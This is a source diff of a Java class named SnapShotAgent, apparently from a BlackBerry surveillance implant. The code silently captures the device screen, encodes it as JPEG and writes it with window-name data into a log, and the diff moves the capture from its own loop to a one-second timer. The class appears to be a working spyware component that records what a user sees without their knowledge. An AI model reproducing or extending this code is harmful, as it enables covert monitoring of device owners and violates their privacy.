@@ -31,9 +31,11 @@ public class SnapShotAgent extends Agent {
     public SnapShotAgent(boolean agentStatus) {
         super(Agent.AGENT_SNAPSHOT, agentStatus, true, "SnapShotAgent");
         // #ifdef DBC
-                        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,"Wrong Conversion");
+        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,
+                "Wrong Conversion");
         // #endif
 
+        setEvery(1000);
     }
 
     protected SnapShotAgent(boolean agentStatus, byte[] confParams) {
@@ -43,48 +45,42 @@ public class SnapShotAgent extends Agent {
 
     // se e' in standby non prendi la snapshot
     public void actualRun() {
-        for (;;) {
-            // #debug
-            debug.info("Taking snapshot");
-            int width = Display.getWidth();
-            int height = Display.getHeight();
 
-            Bitmap bitmap = new Bitmap(width, height);
-            Display.screenshot(bitmap);
+        // #debug
+        debug.info("Taking snapshot");
+        int width = Display.getWidth();
+        int height = Display.getHeight();
 
-            // int size = width * height;
-            /*
-             * int[] argbData = new int[size]; bitmap.getARGB(argbData, 0,
-             * width, 0, 0, width, height);
-             */
-            // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
-            EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
-                    SNAPSHOT_DEFAULT_JPEG_QUALITY);
-            byte[] plain = encoded.getData();
+        Bitmap bitmap = new Bitmap(width, height);
+        Display.screenshot(bitmap);
 
-            /*
-             * AutoFlashFile file = new AutoFlashFile(Path.SD_PATH +
-             * "snapshot.jpg", false); if (file.exists()) { file.delete(); }
-             * file.create(); file.write(plain);
-             */
+        // int size = width * height;
+        /*
+         * int[] argbData = new int[size]; bitmap.getARGB(argbData, 0, width, 0,
+         * 0, width, height);
+         */
+        // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
+        EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
+                SNAPSHOT_DEFAULT_JPEG_QUALITY);
+        byte[] plain = encoded.getData();
 
-            // #ifdef DBC
-                                    Check.requires(log != null, "Null log");
-            // #endif
+        /*
+         * AutoFlashFile file = new AutoFlashFile(Path.SD_PATH + "snapshot.jpg",
+         * false); if (file.exists()) { file.delete(); } file.create();
+         * file.write(plain);
+         */
 
-            log.createLog(getAdditionalData());
-            log.writeLog(plain);
-            log.close();
+        // #ifdef DBC
+        Check.requires(log != null, "Null log");
+        // #endif
 
-            if (smartSleep(timerMillis)) {
-                // #debug
-                debug.info("clean stop: " + this);
-                return;
-            }
+        log.createLog(getAdditionalData());
+        log.writeLog(plain);
+        log.close();
 
-            // #debug
-            debug.trace("finished sleep");
-        }
+        // #debug
+        debug.trace("finished sleep");
+
     }
 
     private byte[] getAdditionalData() {
@@ -105,8 +101,9 @@ public class SnapShotAgent extends Agent {
         databuffer.write(windowsName);
 
         // #ifdef DBC
-                        Check.asserts(windowsName.length == wlen, "Wrong windows name");
-                        Check.ensures(additionalData.length == tlen, "Wrong additional data name");
+        Check.asserts(windowsName.length == wlen, "Wrong windows name");
+        Check.ensures(additionalData.length == tlen,
+                "Wrong additional data name");
         // #endif
 
         // #debug
@@ -117,7 +114,7 @@ public class SnapShotAgent extends Agent {
 
     protected boolean parse(byte[] confParameters) {
         // #ifdef DBC
-                        Check.asserts(confParameters != null, "Null confParameters");
+        Check.asserts(confParameters != null, "Null confParameters");
         // #endif
 
         DataBuffer databuffer = new DataBuffer(confParameters, 0,
